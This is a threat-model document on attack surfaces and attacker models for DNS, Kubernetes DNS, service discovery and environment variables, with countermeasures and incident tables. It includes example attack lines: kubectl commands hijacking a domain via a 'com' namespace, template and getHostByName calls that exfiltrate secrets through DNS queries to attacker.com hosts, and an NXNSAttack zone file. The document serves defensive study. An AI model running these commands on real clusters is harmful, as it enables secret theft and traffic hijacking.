# Context 04: Attacker Models & Attack Surface for Namespaces and Naming Services


---

## 1. Introduction

Namespaces and naming services are the foundational lookup infrastructure of the
Internet and of virtually every distributed system. They map human-readable
names to resources — IP addresses, service endpoints, configuration values, and
more. Because nearly every networked action begins with a name lookup, these
systems are **high-value targets** for attackers.

This document provides a structured analysis of:

- The **attack surface** — all the points where an adversary can interact with,
  manipulate, or exploit a naming system.
- The **attacker models** — who the adversaries are, what capabilities they
  possess, and what they aim to achieve.

The primary focus is on **DNS** (the Domain Name System), but the analysis
extends to **environment variables (ENVs)**, **Kubernetes DNS**, **service
discovery systems**, and other namespace infrastructure.

---

## 2. What Are Naming Services & Namespaces?

| Naming Service | What It Maps | Scope |
|---|---|---|
| **DNS** | Domain names → IP addresses | Global Internet |
| **Environment Variables** | Variable names → string values (paths, secrets, config) | OS / process / container |
| **Kubernetes DNS** | Service names → pod IPs | Cluster-internal |
| **Service Discovery (Consul, etcd, etc.)** | Service names → endpoints | Datacenter / cloud |
| **Private Namespaces (social handles, etc.)** | Username → identity/account | Platform-specific |

All of these share common architectural patterns:

- **Hierarchical or flat structure** for organizing names
- **Client-server resolution** — a client queries, a server responds
- **Caching** for performance
- **Delegation** — authority over sub-namespaces handed to child authorities
- **Trust** — clients trust that the resolution they receive is correct

Each of these patterns introduces attack surface.

---

## 3. The Attack Surface

The attack surface of a naming service is the full set of points where an
attacker can interact with, manipulate, or exploit the system. It spans seven
major areas.

### 3.1 Data Storage / Zone Files

The authoritative databases that hold name→value mappings (DNS zone files,
environment variable stores, service registries, etc.).

**Threats:**

- **Unauthorized modification** of records → redirect traffic, impersonate
  services, change service endpoints
- **Destruction or corruption** of the database → denial of service (names
  can't be resolved, services can't be found)
- **Back-door access** — OS-level file system access, backup/restore facilities,
  and low-level disk access can bypass application-level controls on the data
  store
- **Resource exhaustion** — if disk or memory is exhausted, the name server
  cannot store new bindings or process requests
- **Stale / dangling records** — DNS records pointing to decommissioned or
  expired resources (e.g., a CNAME pointing to a deleted cloud storage bucket
  or CDN endpoint). An attacker can re-register the dangling resource and
  hijack the name.
- **Reuse of storage resources** — information can be disclosed or corrupted if
  storage is reused without purging previous contents

**Countermeasures:**

- Cryptographic sealing/signing of data at rest
- OS access controls, physical access controls
- Replicated name servers, backup procedures
- Resource monitoring and alerting
- Regular audits for dangling/stale records

### 3.2 Communication Channels

The network protocols used between clients, resolvers, and authoritative
servers. Standard DNS uses unencrypted UDP, making it inherently vulnerable.

**Threats:**

- **Masquerade of communications partner** — attacker impersonates a name
  server and supplies false name→object bindings. If false information is
  cached, the subversion can persist for an extended period.
- **Masquerade of authorized client** — attacker impersonates a legitimate
  client to create, modify, or delete bindings
- **Message insertion / modification** — attacker injects or modifies messages
  in the communication stream, making it appear the name server returned
  additional information that gets cached
- **Eavesdropping** — unencrypted DNS traffic reveals user behavior, service
  usage patterns, and network topology to anyone monitoring the wire
- **Cache poisoning** — forged DNS responses injected into a resolver's cache,
  affecting all users of that resolver until the TTL expires
- **Amplification attacks** — DNS's UDP-based, connectionless design allows
  reflection/amplification DDoS:
  - **NXNSAttack**: packet amplification factor of 1620× against recursive
    resolvers by crafting referral responses with many glueless NS records
  - **CAMP (Compositional Amplification)**: combines multiple DNS features
    (fan-out, chaining, self-probing) to achieve multiplicative amplification
    factors of hundreds to thousands
  - **TsuNAME**: exploits cyclical delegations between zones to force
    resolvers into endless query loops
  - **Unchained**: uses CNAME chains split across servers to amplify queries
- **Repudiation** — originator of a message that modifies a binding may deny
  having sent it
- **Network congestion / damage** — overloading the network or physically
  disrupting it impairs name service availability

**Countermeasures:**

- Authentication exchanges between client and server (GSS-API, SSL, IPsec,
  TLS)
- Digital signatures for message integrity and origin verification (DNSSEC)
- Encryption of messages (DoT, DoH, DNSCurve)
- Query limits: `MaxFetch(k)`, `max-recursion-queries`, global per-request
  quotas
- Rate limiting and anomaly detection

### 3.3 Client & Administrative Interfaces

The APIs and control panels used to manage name bindings.

**Threats:**

- **Masquerade** — a name service client presents a user identity that does not
  belong to its principal
- **Exercise of unauthorized authority** — a program uses services it is not
  authorized to use, or accesses information it is not authorized to access
- **Abuse of authorized access** — legitimate admins perform actions
  irresponsibly or maliciously (hard to prevent; relies on auditing)
- **Substitution or modification of name service programs** — trojaned DNS
  software that modifies requests/responses
- **Substitution or modification of dynamic linked libraries** — DLL/shared
  library hijacking to intercept name resolution at the client level
- **Incomplete operations** — interrupted binding or attribute management
  operations leaving partially completed updates that compromise integrity

**Countermeasures:**

- Client authentication to the name service
- Access control policy enforcement based on authentication and authorization
- Control and monitoring of software configuration on hosts
- Static linking or monitoring of dynamic library configurations
- Transaction processing techniques for atomicity of operations
- Security audit logging of all binding and attribute management actions

### 3.4 Delegation & Trust Boundaries

The hierarchical trust model where authority is delegated from parent to child
zones. This is a core architectural feature of DNS and similar hierarchical
naming systems.

**Threats:**

- **Cross-zone attacks** — exploiting shared DNS infrastructure to inject
  records across authority boundaries. The "XDAuth" attack demonstrated this
  against providers like Amazon Route 53, NSONE, and DigiCert, affecting
  125,124 domains including the World Bank and BBC.
- **Subdomain takeover** — registering a dangling subdomain's underlying
  resource (decommissioned CDN, expired cloud service) and hijacking the name.
  Real examples: Ferrari NFT scam via `forms.ferrari.com`, UK government
  transport site `charts.dft.gov.uk` showing pornographic content, Wired
  subdomain hosting casino content.
- **Lame / stale delegations** — NS records pointing to expired or
  non-responsive name servers. An attacker can re-register the expired
  name server domain and hijack all delegations pointing to it.
- **Glue record manipulation** — out-of-bailiwick glue records can be used for
  cache poisoning. In-bailiwick glueless records can cause circular
  dependencies.
- **Stale DNS glue records** — old glue records at parent zones can be
  exploited to hijack delegations even after a domain has changed its
  name servers.
- **Unauthorized subdomain creation** — in environments where anyone can add
  a domain to their account without verifying ownership (access control
  weakness)

**Countermeasures:**

- Zone isolation in shared DNS infrastructure
- Regular scanning for dangling DNS records and subdomain takeover
  vulnerabilities
- Delegation signing (DNSSEC DS records)
- Out-of-band verification for delegation changes
- Registry Lock for high-value domains

### 3.5 Namespace Collisions & Name Confusion

The fact that names can overlap or be confused across different contexts is a
fundamental and often-overlooked attack vector.

**Threats:**

- **Kubernetes DNS hijacking via namespace collision** — Kubernetes pods have
  `ndots:5` and a search path of `default.svc.cluster.local svc.cluster.local
  cluster.local`. If a name has fewer than 5 dots, the resolver appends search
  domains before trying the name as fully qualified. An attacker who creates a
  namespace named `com` and a service named `example` causes
  `example.com.svc.cluster.local` to resolve internally, redirecting
  `example.com` traffic to an attacker-controlled endpoint — **without any
  exploit, just legitimate namespace and service creation**.

  ```
  # Attacker's two-step hijack:
  kubectl create namespace com
  kubectl create service externalname example \
    --namespace com \
    --external-name=attacker.evil.com
  ```

- **Typosquatting** — subtle misspellings (`faceboook.com` vs `facebook.com`)
  used for phishing and ad fraud
- **Internationalized Domain Name (IDN) homograph attacks** — Unicode
  look-alikes (`applé.com` vs `apple.com`) that appear identical depending on
  font
- **Bitsquatting** — registering domains one bit different from legitimate
  ones to catch hardware/bit-flip errors
- **Domain search suffix abuse** — stub resolvers that append search domains
  can be tricked into resolving the wrong name
- **Facsimile domains** — domain suffix appending
  (`www.icann.org.example.com` instead of `www.icann.org`), hidden in HTML
  links

**Countermeasures:**

- Admission controllers to reject namespace names matching TLDs (`com`, `org`,
  `io`, etc.)
- Mandating fully qualified domain names (trailing dot: `example.com.`)
- Browser URL highlighting and IDN display as ASCII "A-label"
- Safe browsing / blocklist services
- Auto-completion features to reduce typos

### 3.6 Infrastructure & Configuration Choices

Operational decisions that expand or contract the attack surface. These are
not protocol vulnerabilities but human/configurable vulnerabilities.

**Threats:**

- **Long TTLs** — hijacked or poisoned records persist in caches for extended
  periods (hours or days). When a hijack is detected and corrected, the bad
  data remains in distributed caches until TTL expires. Also, long TTLs on
  poisoned records impact many more DNS requests.
- **Short TTLs** — faster propagation of attacks; harder forensics (ephemeral
  caches leave less evidence). An attacker can launch a targeted phishing
  campaign with a TTL just long enough to cover the attack, then the evidence
  disappears.
- **Fate sharing** — running authoritative and recursive DNS servers on the
  same physical device (a bug crashes both); placing all critical domains on
  the same DNS provider (DDoS against the provider takes down everything);
  having all "DDoS-prone services" on the same infrastructure.
- **Poor operational hygiene** — unpatched DNS software with known
  vulnerabilities, default credentials on routers, all name servers on the same
  subnet (single network failure takes out everything), reliance on security
  through obscurity.

**Countermeasures:**

- Context-appropriate TTL selection based on service type
- Diversification of DNS infrastructure (different providers, networks, geos)
- Separation of authoritative and recursive servers
- Regular patching and software updates
- Following MANRS and KINDNS best practices

### 3.7 Environment Variables as a Naming Service

Environment variables are a simpler but significant namespace with their own
distinct attack surface. They map variable names to string values and are used
for process configuration, path resolution, and — dangerously — secret
storage.

**Threats:**

- **Secret leakage via process introspection** — ENVs are readable via
  `/proc/<pid>/environ` on Linux, via process listing tools, crash dumps, and
  are inherited by all child processes. Any process or user with access to the
  process environment can read all variables, including secrets.
- **ENV injection for execution hijacking** — modifying `LD_PRELOAD`,
  `PATH`, `PYTHONPATH`, `NODE_PATH`, `JAVA_TOOL_OPTIONS`, etc. to inject
  malicious libraries or redirect executable resolution.
- **Template injection exposing ENVs** — template engines (Helm, Sprig, Jinja2,
  Go templates) that expose `env()`, `expandenv()`, or `getHostByName()`
  functions to user-controlled templates can leak environment variable values
  to attackers.
- **DNS exfiltration via ENV-derived values** — an attacker who can invoke
  `getHostByName()` or equivalent within a controller process (e.g., via
  template injection) can encode secret/ENV values into DNS query names:
  ```
  # Secret value "supersecret123" encoded as subdomain:
  getHostByName("supersecret123.attacker.com")
  # → DNS query leaves the network carrying the secret in the query name
  ```
  This bypasses egress network controls because the DNS query originates from
  the controller process, not the attacker's workload.
- **ENV variable collision / shadowing** — in containerized environments,
  ENVs from different sources (Dockerfile, docker-compose, Kubernetes Pod
  spec, ConfigMap/Secret refs) can shadow each other, leading to unexpected
  values being used by the application.

**Countermeasures:**

- Never store secrets in ENVs — use dedicated secret managers (Vault, AWS
  Secrets Manager, Kubernetes Secrets with encryption at rest)
- Remove `env`, `expandenv`, `getHostByName` and similar functions from
  user-controlled template engines
- Restrict access to `/proc` filesystems
- Use `LD_PRELOAD` blockers / sanitizers in production
- Monitor DNS queries from controller/management processes for exfiltration
  patterns
- Explicit ENV precedence rules in container orchestration

---

## 4. Attacker Models

The attacker model defines **who** the adversary is, **what capabilities**
they have, and **what they are trying to achieve**. Different attacker models
expose different parts of the attack surface and require different defenses.

### 4.1 On-Path / Off-Path Network Attacker

| Attribute | Description |
|---|---|
| **Who** | Someone who can observe or inject traffic on the network path between DNS components |
| **Position** | On-path (MitM) or off-path (can only send spoofed packets) |
| **Capabilities** | Intercept queries, inject forged responses, observe unencrypted traffic |
| **Limitations** | Off-path attackers must guess transaction IDs and source ports; DNSSEC defeats both; encrypted transports (DoT/DoH) defeat on-path eavesdropping |

**On-path (Man-in-the-Middle):**
- Can intercept queries and respond with forged answers before the legitimate
  server
- Can observe all unencrypted DNS traffic, building user behavior profiles
- Can selectively modify responses (e.g., only for certain geographic regions)
- Can proxy/forward queries to the real server, making detection extremely
  difficult

**Off-path:**
- Can only send spoofed packets — must race the legitimate response
- Needs to predict or brute-force the transaction ID (16 bits) and source port
  (16 bits) — ~4 billion combinations with randomization
- Side-channel attacks (SAD DNS) can infer the transaction ID by exploiting
  ICMP rate limiting on the resolver

**Goals:** Redirect traffic to malicious sites, steal credentials, inject
malware, conduct surveillance

**Examples:**
- SAD DNS (off-path cache poisoning via ICMP side channels, CCS 2020)
- TrickBot's `shaDll` module (on-path MitM with SSL certificate injection)
- NSA's QUANTUMDNS (man-on-the-side response injection)
- Captive portals (legitimate but technically authoritative server
  impersonation)

### 4.2 Malicious Authoritative Server Operator

| Attribute | Description |
|---|---|
| **Who** | Anyone who can register a domain and operate an authoritative DNS server |
| **Cost** | <$1 and <5 minutes to register a domain |
| **Capabilities** | Craft arbitrary DNS responses, set up zones with any records, create referral responses with any number of NS records |
| **Key insight** | Uses entirely legitimate DNS features in abusive combinations — no exploit needed |

This is one of the most dangerous attacker models because it requires **no
compromise at all** — just the legitimate ability to operate a DNS server.

**Attack techniques:**

- **NXNSAttack** — craft referral responses with many glueless/out-of-bailiwick
  NS records, forcing the resolver to initiate 2n new resolutions per referral.
  Amplification factor: up to 1620× packets against recursive resolvers, 1071×
  against root/TLD servers.
  ```
  # Attacker's zone file:
  sd0.attacker.com. IN NS ns1.fakens0.com.
  sd0.attacker.com. IN NS ns1.fakens1.com.
  ...
  sd0.attacker.com. IN NS ns1.fakens-n.com.
  # No glue records provided → resolver must resolve each NS name separately
  ```

- **CAMP (Compositional Amplification)** — combine multiple amplification
  primitives (fan-out, referral chains, rewrite chains, query name
  minimization, dense delegation) to achieve multiplicative amplification.
  2D compositions reach MAF of several hundred; 3D compositions reach several
  thousand.
  ```
  # Fan-out × Chaining example:
  # Primary: large NS RRset (fan-out)
  # Secondary: each NS name is a CNAME chain (chaining)
  # Result: MAF = 1 + x + x*y where x=fan-out size, y=chain length
  ```

- **TsuNAME** — set up cyclical delegations between two zones, forcing
  resolvers into endless query loops between the name servers.

- **Unchained** — CNAME chains split across two servers, forcing the resolver
  to individually resolve each name on the chain.

- **Cross-zone record injection (XDAuth)** — exploit shared authoritative
  nameserver infrastructure that fails to isolate data across zones, injecting
  arbitrary resource records across logical authority boundaries.

**Goals:** DDoS amplification against resolvers, authoritative servers, or
root/TLD infrastructure; covert domain hijacking

### 4.3 Credential Compromise Attacker

| Attribute | Description |
|---|---|
| **Who** | Someone who has stolen credentials for a registrar account, DNS provider console, registry, or reseller |
| **Capabilities** | Modify NS records, A/AAAA records, MX records, DNSSEC DS records; transfer or delete domains; procure TLS certificates |
| **Methods** | Phishing, credential stuffing, password spraying, social engineering, malware, email account compromise, insider theft |
| **Impact** | Global traffic redirection, email interception, certificate fraud, complete domain hijack |

**What they can do after compromise:**

- Transfer the domain out of the registrant's control
- Modify DNS servers to intercept/redirect traffic
- Modify authoritative records to monitor, alter, or deny queries
- Remove DNSSEC DS records, disabling DNSSEC protections
- Delete or de-register the domain
- Procure fraudulent TLS certificates (using DNS control for domain
  validation)
- Modify MX records to intercept email

**Goals:** Domain hijacking, traffic interception, credential harvesting,
persistent access, brand impersonation

**Examples:**
- **Sea Turtle campaign** — nation-state DNS hijacking across 13 countries,
  targeting 40+ telecom, media, and government entities. Changed A-Records to
  redirect victims to spoofed credential-harvesting sites.
- **DNSpionage** — Middle East targeted campaign manipulating DNS records at
  scale.
- **Melbourne IT / NY Times hack (2013)** — attackers breached Melbourne IT's
  reseller credentials, hijacked NY Times, Twitter, Huffington Post domains.
- **Brazilian bank hijack** — attackers created malicious clones of bank
  sites with valid HTTPS certificates, redirecting all visitors for ~5 hours.
- **MyEtherWallet (2018)** — local DNS hijack via malware, redirecting to fake
  wallet site, stealing >$150,000 in cryptocurrency.
- **Galxe.com (2024)** — domain re-routed to phishing site via supplier account
  compromise.
- **~70,000 domains hijacked (2024)** — large-scale DNS server compromise
  redirecting legitimate traffic to malicious sites.

### 4.4 Insider / Authorized-but-Malicious Operator

| Attribute | Description |
|---|---|
| **Who** | Someone with legitimate administrative access to the naming service |
| **Capabilities** | All authorized operations within their scope — modify bindings, attributes, delegations |
| **Challenge** | Cannot be prevented by technical controls alone; relies on audit, detection, and deterrence |
| **Motivations** | Sabotage, data exfiltration, persistent access, financial gain, ideological |

**Threats:**
- Irresponsible or malicious exercise of authorized operations
- Modifying bindings to redirect traffic for personal gain
- Creating unauthorized subdomains or delegations
- Removing security controls (e.g., disabling DNSSEC)
- Modifying audit logging to cover tracks

**Countermeasures:**
- Security audit logging of all binding and attribute management actions
- Segregation of duties
- Regular access reviews and least-privilege enforcement
- Change management processes with peer review
- Anomaly detection on administrative actions

### 4.5 Namespace Tenant Attacker (Cloud-Native / Kubernetes)

| Attribute | Description |
|---|---|
| **Who** | A tenant in a shared cluster or mesh who can create namespaces, services, or configuration resources |
| **Capabilities** | Create namespaces with arbitrary names, create services (including ExternalName), deploy Istio VirtualService/Gateway resources |
| **Key insight** | Uses entirely legitimate operations — no exploit needed, just understanding of namespace resolution behavior |
| **Requirements** | Permission to create namespaces and/or services; or permission to deploy Istio CRDs in their namespace |

**Attack techniques:**

**Kubernetes DNS Hijack:**
- Create a namespace named after a TLD (e.g., `com`)
- Create a service named after the target domain's SLD (e.g., `example`)
- The Kubernetes DNS search path causes `example.com` to resolve as
  `example.com.svc.cluster.local` → the attacker's service
- Traffic intended for the external `example.com` never leaves the cluster

**Istio VirtualService MitM:**
- Create a `VirtualService` with `gateways: mesh` in the attacker's namespace
- Define routing rules for arbitrary hosts (including hosts used by services in
  other namespaces)
- Mesh-level routing rules apply to all sidecar proxies regardless of namespace
- Attacker can transparently intercept, redirect, or drop traffic from other
  tenants
- This works because Istio's CRDs were designed before namespace-based RBAC
  existed in Kubernetes — multi-tenancy was not in the threat model

**DNS-based cluster reconnaissance:**
- The default `kube-dns` assigns DNS entries to all pods and services
- Any pod can query any DNS record — no authentication or throttling
- Reverse nslookup sweeps reveal cluster size, deployments, service names
  (nginx, mysql, etc.)

**Goals:** Traffic interception, lateral movement, credential theft,
cross-tenant attacks, cluster reconnaissance, denial of service

### 4.6 Powerful Nation-State Adversary

| Attribute | Description |
|---|---|
| **Who** | State-sponsored actors with significant technical, legal, and financial resources |
| **Capabilities** | Network-level mass surveillance, active traffic injection, covert monitoring infrastructure, BGP hijacking, legal compulsion of registrars/registries |
| **Scale** | Global (13+ countries for NSA's PACKAGEDGOODS infrastructure) |
| **Examples** | NSA's MORECOWBELL, QUANTUMDNS, QUANTUMTHEORY programs |

**Capabilities in detail:**

- **Passive surveillance** — monitor unencrypted DNS traffic globally via
  network tapping (TURMOIL, XKEYSCORE). Build profiles of user behavior,
  discover services, identify targets.
- **Active injection (man-on-the-side)** — inject forged DNS responses in
  real-time, racing legitimate responses. QUANTUMDNS is documented as
  operational and successfully used.
- **Covert monitoring** — MORECOWBELL uses dedicated covert infrastructure
  (servers in Malaysia, Germany, Denmark) to actively query DNS servers and
  check HTTP availability of targets, ensuring queries aren't attributed to the
  US government. Used for "Battle Damage Indication" after cyber attacks.
- **BGP hijacking** — manipulate routing tables to redirect traffic to
  attacker-controlled infrastructure. Examples: YouTube hijacking by Pakistan
  Telecom, Bitcanal route hijacks, payment processing service attacks.
- **Legal compulsion** — compel registrars, registries, or DNS operators within
  jurisdiction to modify records, block domains, or provide user data. This is
  a form of censorship that cannot be countered by technical means alone.
- **Registrar/registry compromise** — targeted attacks on DNS infrastructure
  providers (as in Sea Turtle) with nation-state resources.

**Goals:** Mass surveillance, targeted attack confirmation, censorship,
targeted exploitation, information warfare

**Defenses against this model:**
- DNS encryption (DoT/DoH/DoQ) to defeat passive surveillance
- DNSSEC to detect injected responses
- Decentralized name systems (Namecoin, GNS) for censorship resistance
- RPKI/ROA for BGP origin validation
- Query name minimization to reduce metadata exposure

### 4.7 Template / Function Injection Attacker (ENV-Specific)

| Attribute | Description |
|---|---|
| **Who** | Someone who can create or modify templated resources (e.g., ExternalSecret templates, Helm charts, CI/CD pipelines) that execute within a privileged process |
| **Capabilities** | Invoke functions exposed by the template engine within the controller/management process context |
| **Requirements** | Permission to create/update templated resources; template engine exposes dangerous functions |
| **Impact** | Data exfiltration via DNS, secret leakage, environment variable exposure |

**Attack technique (CVE-2026-34984 example):**

The External Secrets Operator (ESO) v2 template engine removed `env` and
`expandenv` from Sprig's function map but left `getHostByName` accessible.
Since ESO executes templates within its controller process:

1. Attacker creates a templated `ExternalSecret` resource
2. Template references secret values and passes them to `getHostByName()`
3. `getHostByName()` triggers a DNS lookup from the controller process
4. The secret value is encoded into the DNS query name
5. DNS query reaches attacker's authoritative server, which logs the query
6. Attacker decodes the secret from the query name

```
# Attacker's template (simplified):
{{ getHostByName (printf "%s.exfil.attacker.com" .secretValue) }}
# → DNS query: <secret-value>.exfil.attacker.com
# → Attacker's DNS server logs the query and extracts the secret
```

**Why this is dangerous:**
- No direct outbound network access needed from the attacker's workload
- DNS is almost universally allowed through firewalls
- The exfiltration channel is the DNS protocol itself
- Detection requires monitoring DNS queries from management/controller processes

**Goals:** Secret exfiltration, data leakage, bypassing network egress controls

**Countermeasures:**
- Remove all network/OS functions (`getHostByName`, `env`, `expandenv`,
  `os/exec`, etc.) from user-controlled template engines
- Sandbox template execution
- Monitor DNS queries from controller/management processes for exfiltration
  patterns (long subdomains, high-entropy query names, unusual query volumes)
- Restrict who can create templated resources
- Use separate, isolated processes for template execution

---

## 5. Attack Surface vs. Attacker Model Matrix

| Attack Surface Component | On/Off-Path | Malicious Auth | Credential Compromise | Insider | Namespace Tenant | Nation-State | Template Injector |
|---|:---:|:---:|:---:|:---:|:---:|:---:|:---:|
| Data storage / zone files | | ✓ | ✓ | ✓ | | ✓ | |
| Communication channels | ✓ | ✓ | | | | ✓ | |
| Client / admin APIs | | | ✓ | ✓ | | ✓ | |
| Delegation & trust boundaries | | ✓ | ✓ | ✓ | | ✓ | |
| Namespace collisions | | | | | ✓ | | |
| Infrastructure config | ✓ | ✓ | ✓ | ✓ | ✓ | ✓ | |
| Environment variables | | | ✓ | ✓ | ✓ | | ✓ |

---

## 6. Defensive Measures

| Defense | Attackers Addressed | Attack Surface Reduced |
|---|---|---|
| **DNSSEC** | On-path/off-path, malicious auth | Communication channels, delegation |
| **DNS-over-TLS / DNS-over-HTTPS** | On-path, nation-state (passive) | Communication channels |
| **Query Name Minimization** | Nation-state, on-path | Communication channels |
| **Registry Lock** | Credential compromise | Data storage, admin APIs |
| **MFA on registrar/DNS accounts** | Credential compromise | Admin APIs |
| **MaxFetch(k) / global query limits** | Malicious auth | Communication channels |
| **Admission controls (K8s)** | Namespace tenant | Namespace collisions |
| **FQDN enforcement (trailing dot)** | Namespace tenant | Namespace collisions |
| **Network policies (K8s)** | Namespace tenant | Communication channels, infrastructure |
| **Sandboxed templates** | Template injector | Environment variables |
| **Passive DNS monitoring** | All | All (detection) |
| **BGP security (RPKI/ROA)** | Nation-state | Communication channels |
| **Decentralized name systems** | Nation-state (censorship) | Delegation, data storage |
| **Regular dangling record audits** | Credential compromise, malicious auth | Delegation, data storage |
| **Separation of auth/recursive servers** | All | Infrastructure config |
| **DNS sinkholing / filtering** | On-path, malicious auth | Communication channels |
| **Endpoint malware protection** | On-path (local), credential compromise | Client interfaces |
| **Router firmware updates / hardening** | On-path (router) | Communication channels |
| **Audit logging & anomaly detection** | Insider, all | Admin APIs, data storage |
| **Secret managers (not ENVs)** | Template injector, insider | Environment variables |

---

## 7. Key Real-World Incidents

| Year | Incident | Attacker Model | Attack Surface |
|---|---|---|---|
| 2008 | YouTube BGP hijack (Pakistan Telecom) | Nation-state-level | Route manipulation |
| 2013 | NY Times / Twitter / HuffPost hijack (via Melbourne IT) | Credential compromise | Admin APIs, delegation |
| 2014 | Moniker.com mass domain hijack | Credential compromise | Admin APIs |
| 2015 | Webnic.cc registrar breach (Lenovo, Google hijack) | Credential compromise | Admin APIs |
| 2016 | Mirai botnet DDoS against Dyn | Botnet (amplification) | Communication channels, DoS |
| 2018 | MyEtherWallet local DNS hijack | On-path (local malware) | Client interfaces |
| 2018-2019 | Sea Turtle campaign (13 countries, 40+ entities) | Nation-state | Delegation, admin APIs |
| 2018-2019 | DNSpionage (Middle East) | Nation-state | Admin APIs, delegation |
| 2020 | NXNSAttack disclosed | Malicious auth | Communication channels (amplification) |
| 2020 | Ferrari subdomain hijack (`forms.ferrari.com`) | Credential/registration | Delegation (dangling) |
| 2020 | UK gov transport site (`charts.dft.gov.uk`) | Registration | Delegation (dangling) |
| 2024 | ~70,000 domains hijacked via DNS server compromise | Credential compromise | Data storage, delegation |
| 2024 | Galxe.com domain re-routed to phishing | Supplier compromise | Admin APIs |
| 2024 | CAMP amplification attacks disclosed | Malicious auth | Communication channels (amplification) |
| 2024 | SEC Twitter/X account compromise | Credential (no 2FA) | Admin APIs (private namespace) |
| 2026 | CVE-2026-34984 (ESO DNS exfiltration via templates) | Template injector | Environment variables |

---

## 8. References & Further Reading

### Academic Papers

1. **NXNSAttack** — Afek, Bremler-Barr, Shafir. USENIX Security 2020.
2. **CAMP: Compositional Amplification Attacks against DNS** — Duan et al.
   USENIX Security 2024.
3. **Cross the Zone** — Zhang et al. USENIX Security 2024 (XDAuth cross-zone
   attacks).
4. **SAD DNS** — Man et al. CCS 2020 (off-path cache poisoning via side
   channels).
5. **DNS Unchained** — Bushart & Rossow. RAID 2018 (CNAME chain
   amplification).
6. **TsuNAME** — Moura et al. IMC 2021 (cyclical delegation DoS).
7. **A Survey and Evaluation Framework for Secure DNS Resolution** — Jahromi,
   Abdou, van Oorschot. arXiv 2025.
8. **Towards Secure Name Resolution on the Internet** — Grothoff et al. NDSS
   2017 (includes NSA MORECOWBELL/QUANTUMDNS analysis).

### Standards & Reports

9. **Security in Federated Naming — Name Service Threats and Countermeasures** —
   The Open Group, 1997. (Foundational threat taxonomy for naming services.)
10. **DNS Security Facilitation Initiative Technical Study Group — Final
    Report** — ICANN, 2021. (Comprehensive DNS attack vector catalog.)
11. **RFC 1034** — Mockapetris. Domain Names — Concepts and Facilities.
12. **RFC 2181** — Elz & Bush. Clarifications to the DNS Specification.
13. **RFC 7626** — Bortzmeyer. DNS Privacy Considerations.
14. **RFC 7816** — Bortzmeyer. DNS Query Name Minimisation.
15. **RFC 7858** — Hu et al. Specification for DNS over TLS.
16. **RFC 8198** — Fujiwara et al. Aggressive Use of DNSSEC-Validated Cache.
17. **RFC 8767** — Lawrence et al. Serving Stale Data to Improve DNS
    Resiliency.
18. **RFC 9156** — Bortzmeyer et al. DNS Query Name Minimisation to Improve
    Privacy.

### Industry Resources

19. **Palo Alto Networks** — "What Is DNS Hijacking?"
20. **SentinelOne** — "What is DNS Hijacking? Detection, and Prevention
    Strategies."
21. **Rapid7** — "Kubernetes Namespaces Are Not as Secure as You Think."
22. **Jan-Otto Kröpke** — "DNS Hijacking in Kubernetes."
23. **Insinuator.net** — "Security Considerations on Istio's CRDs with
    Namespace-based Multi-Tenancy."
24. **Wikipedia** — "Namespace Security."

### CVEs

25. **CVE-2020-8616** — BIND NXNSAttack vulnerability.
26. **CVE-2020-12662** — Unbound NXNSAttack vulnerability.
27. **CVE-2020-10995** — PowerDNS NXNSAttack vulnerability.
28. **CVE-2026-34984** — External Secrets Operator DNS exfiltration via
    template injection.

---

> **Key Insight:** The most dangerous attacks on naming services often use
> **legitimate features in illegitimate combinations** — whether that's DNS
> amplification primitives composed multiplicatively, Kubernetes namespaces
> named after TLDs, or template functions that leak secrets via DNS queries.
> The defense is not to patch a single vulnerability, but to understand the
> system's resolution behavior deeply enough to identify and close the gaps
> between what the protocol allows and what the threat model should prohibit.
